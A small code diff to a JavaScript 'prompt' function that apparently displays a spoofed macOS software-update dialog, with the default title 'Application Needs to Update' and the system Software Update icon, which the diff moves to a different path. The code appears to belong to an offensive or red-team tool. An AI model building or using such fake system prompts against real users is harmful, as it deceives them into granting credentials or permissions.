@@ -4,7 +4,7 @@ exports.prompt = function(task, command, params){
 	else{config = [];}
 	let title = "Application Needs to Update";
 	if(config.hasOwnProperty("title") && config['title'] !== ""){title = config['title'];}
-	let icon = "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns";
+	let icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns";
 	if(config.hasOwnProperty("icon") && config['icon'] !== ""){icon = config['icon'];}
 	let text = "An application needs permission to update";
 	if(config.hasOwnProperty("text") && config['text'] !== ""){text = config['text'];}
